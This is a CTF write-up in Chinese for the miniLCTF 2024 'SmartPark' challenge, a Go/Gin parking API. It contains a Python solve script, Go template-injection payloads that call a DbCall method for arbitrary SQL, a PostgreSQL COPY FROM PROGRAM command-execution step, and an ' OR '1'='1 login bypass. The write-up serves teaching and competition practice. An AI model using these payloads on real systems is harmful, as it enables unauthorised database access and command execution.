# miniLCTF 2024 SmartPark Writeup

## 题目简述

服务是 Go/Gin 编写的停车管理 API。Swagger 暴露了注册、验证码、登录、源码备份和模板测试接口。预期链为：注册并登录取得 JWT → 下载源码 → 利用 Go `text/template` SSTI 调用模板数据对象的公开方法 → 让 PostgreSQL 超级用户执行任意 SQL 与系统命令。

初版还存在两个非预期 SQL 注入：`vehicleInfo` 的 `describe` 未校验，登录密码正则允许全部可打印字符。本文同时说明非预期入口，但以 SSTI/`DbCall` 作为主线。

## 解题过程

### 获取认证与源码

目录扫描可发现 `/swagger/index.html`。无需猜管理员密码，`POST /account` 本身不要求认证，可注册符合正则的账号；再获取一次验证码并登录：

```python
import requests

s = requests.Session()
base = "http://challenge.example"

s.post(base + "/account", data={"username": "solver1", "password": "Password123"})
captcha = s.get(base + "/captcha").json()
r = s.post(base + "/login", data={
    "username": "solver1",
    "password": "Password123",
    "captcha_key": captcha["key"],
    "captcha_token": captcha["token"],
})
token = r.headers["Authorization"]
headers = {"Authorization": token}
src = s.get(base + "/backup", headers=headers).content
open("src.zip", "wb").write(src)
```

源码显示 `/test` 把请求体直接传给 `template.New(...).Parse`，执行时的数据对象是 `*FastQuery`。Go 模板可以访问其公开字段 `Result`，也能调用公开方法 `DbCall(string)`：

```text
{{.DbCall "SELECT current_user;"}} Result={{.Result}}
```

返回数据库用户 `postgres`，说明连接拥有超级用户能力。

### 通过 PostgreSQL 执行命令

`DbCall` 允许任意 SQL。建立持久表，让 PostgreSQL 的 `COPY FROM PROGRAM` 执行 `echo $FLAG`，再查询结果：

```text
{{.DbCall "DROP TABLE IF EXISTS output; CREATE TABLE output(line text); COPY output FROM PROGRAM 'echo $FLAG';"}}
{{.DbCall "SELECT line FROM output;"}}
{{.Result}}
```

作为请求体发送：

```python
payload = """{{.DbCall \"DROP TABLE IF EXISTS output; CREATE TABLE output(line text); COPY output FROM PROGRAM 'echo $FLAG';\"}}{{.DbCall \"SELECT line FROM output;\"}}{{.Result}}"""
r = s.post(base + "/test", headers=headers, data=payload.encode())
print(r.text)
```

镜像中的 `/flag` 只是 `GET IT FROM ENV` 占位符，真实 flag 由比赛平台放入环境变量，所以必须执行 `echo $FLAG`，不能把占位文本当答案。

### 初版的非预期入口

初版 `parkingAddition` 把未经验证的 `describe` 拼进 INSERT，可直接注入 SQL；登录密码允许 `\x20-\x7e`，`master` 配合 `' OR '1'='1` 也能绕过密码检查。这些入口会缩短认证或数据库访问步骤，但没有改变最终利用 PostgreSQL 权限读取环境变量的目标。

## 方法总结

Go `text/template` 一旦用攻击者模板执行带公开方法的对象，就不仅是信息泄露；方法 `DbCall` 把 SSTI 升级为任意 SQL。随后是否能系统命令执行取决于数据库账户权限，本题明确使用本机 PostgreSQL 超级用户。分析时应区分预期 SSTI 链与初版输入校验遗漏导致的非预期 SQLi。
